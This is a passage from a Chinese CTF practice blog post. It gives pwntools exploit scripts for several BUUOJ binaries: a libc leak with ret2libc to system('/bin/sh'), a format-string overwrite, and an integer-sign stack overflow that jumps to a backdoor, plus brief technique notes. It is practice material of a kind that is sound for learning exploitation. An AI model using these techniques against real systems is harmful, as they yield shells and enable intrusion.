class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vul = <span class="number">0x080485E9</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;read? &quot;</span>, <span class="string">&quot;-1&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x2C</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(printf_plt)</span><br><span class="line">payload += p32(vul)</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;data!\n&quot;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\x0a&quot;</span>)</span><br><span class="line">printf_libc = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">libc_base = u32(io.recv(<span class="number">4</span>)) - printf_libc</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)) + libc_base</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;read? &quot;</span>, <span class="string">&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x2C</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(system_libc)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;data!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><blockquote>
<p>32位fmt</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./fm&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27617</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;break printf\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, cmd)</span></span><br><span class="line">target = <span class="number">0x0804A02C</span></span><br><span class="line">payload = <span class="string">&#x27;%4c%13$n&#x27;</span></span><br><span class="line">payload += p32(target)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>整体比较简单,注意在栈上可以直接把目标地址输入进去</p>
<h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><blockquote>
<p>64位整型符号漏洞,栈溢出</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26367</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;break main\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, cmd)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000400726</span></span><br><span class="line">pop_rdi_r15 = <span class="number">0x0000000000400891</span> </span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_r15) <span class="comment"># 这里把rdi置零了</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="关于system-“-bin-sh”"><a href="#关于system-“-bin-sh”" class="headerlink" title="关于system(“/bin/sh”)"></a>关于system(“/bin/sh”)</h4><p>有时候有可能在本地打不通,但是脚本是对的一直卡在xmm0寄存器的地方,然后报SIGSEGV错误,记得管一下rsi,置零就行</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/07/09/ubuntu%E9%94%99%E8%AF%AF%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" rel="prev" title="ubuntu错误及解决方法">
      <i class="fa fa-chevron-left"></i> ubuntu错误及解决方法
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/08/02/Misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="next" title="Misc刷题记录">
      Misc刷题记录 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    
  <div class="comments">
    <div id="lv-container" data-id="city" data-uid="MTAyMC81MzE3MS8yOTY0Nw=="></div>
  </div>
  

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01"><span class="nav-number">1.</span> <span class="nav-text">0x01</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-level0"><span class="nav-number">1.1.</span> <span class="nav-text">jarvisoj_level0</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E7%A0%81%EF%BC%8C%E8%B4%9F%E6%95%B0"><span class="nav-number">1.1.1.</span> <span class="nav-text">补码，负数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-level1"><span class="nav-number">1.2.</span> <span class="nav-text">jarvisoj_level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-level2-x86"><span class="nav-number">1.3.</span> <span class="nav-text">jarvisoj_level2_x86</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">1.4.</span> <span class="nav-text">jarvisoj_level2_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D%E4%BC%A0%E5%8F%82"><span class="nav-number">1.4.1.</span> <span class="nav-text">64位传参</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwntools%EF%BC%88elf%EF%BC%89-amp-amp-ROPgadget"><span class="nav-number">1.4.2.</span> <span class="nav-text">pwntools（elf）&amp;&amp;ROPgadget</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inndy-rop"><span class="nav-number">1.5.</span> <span class="nav-text">inndy_rop</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5"><span class="nav-number">1.5.1.</span> <span class="nav-text">静态链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#execve"><span class="nav-number">1.5.2.</span> <span class="nav-text">execve</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ropper"><span class="nav-number">1.5.3.</span> <span class="nav-text">ropper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROPdaget%EF%BC%88ropchain%EF%BC%89"><span class="nav-number">1.5.4.</span> <span class="nav-text">ROPdaget（ropchain）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#calculator"><span class="nav-number">1.6.</span> <span class="nav-text">calculator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#keer%E2%80%99s-bug"><span class="nav-number">1.7.</span> <span class="nav-text">keer’s bug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babymessage"><span class="nav-number">1.8.</span> <span class="nav-text">babymessage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-go"><span class="nav-number">1.9.</span> <span class="nav-text">easy_go</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1seccomp-tools"><span class="nav-number">1.9.1.</span> <span class="nav-text">沙箱seccomp-tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init-%E4%B8%87%E8%83%BDgadget"><span class="nav-number">1.9.2.</span> <span class="nav-text">init 万能gadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#orw%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.9.3.</span> <span class="nav-text">orw注意事项</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#axb-2019-fmt32"><span class="nav-number">1.10.</span> <span class="nav-text">axb_2019_fmt32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#axb-2019-fmt64"><span class="nav-number">1.11.</span> <span class="nav-text">axb_2019_fmt64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fmtstr-payload"><span class="nav-number">1.11.1.</span> <span class="nav-text">fmtstr_payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wdb-2018-2nd-easyfmt"><span class="nav-number">1.12.</span> <span class="nav-text">wdb_2018_2nd_easyfmt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hitcontraining-playfmt"><span class="nav-number">1.13.</span> <span class="nav-text">hitcontraining_playfmt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wustctf2020-babyfmt"><span class="nav-number">1.14.</span> <span class="nav-text">wustctf2020_babyfmt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#close-1"><span class="nav-number">1.14.1.</span> <span class="nav-text">close(1)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bbctf-2020-fmt-me"><span class="nav-number">1.15.</span> <span class="nav-text">bbctf_2020_fmt_me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unprintableV"><span class="nav-number">1.16.</span> <span class="nav-text">unprintableV</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#strncmp-str1-str2-n"><span class="nav-number">1.16.1.</span> <span class="nav-text">strncmp(str1,str2,n)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#orw%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%9D%E5%A4%96%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%E4%BB%A5%E5%8F%8A%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC"><span class="nav-number">1.16.2.</span> <span class="nav-text">orw的一些额外注意事项以及爆破脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2-sctf-2016"><span class="nav-number">1.17.</span> <span class="nav-text">pwn2_sctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B4%E5%9E%8B%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.17.1.</span> <span class="nav-text">整型类型转换的漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-fm"><span class="nav-number">1.18.</span> <span class="nav-text">jarvisoj_fm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bjdctf-2020-babystack2"><span class="nav-number">1.19.</span> <span class="nav-text">bjdctf_2020_babystack2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Esystem-%E2%80%9C-bin-sh%E2%80%9D"><span class="nav-number">1.19.1.</span> <span class="nav-text">关于system(“&#x2F;bin&#x2F;sh”)</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="STEVE"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">STEVE</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Mon Apr 05 2021 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">STEVE</span>
</div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script>
NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
  window.livereOptions = {
    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
  };
  (function(d, s) {
    var j, e = d.getElementsByTagName(s)[0];
    if (typeof LivereTower === 'function') { return; }
    j = d.createElement(s);
    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
    j.async = true;
    e.parentNode.insertBefore(j, e);
  })(document, 'script');
});
</script>

</body>
</html>
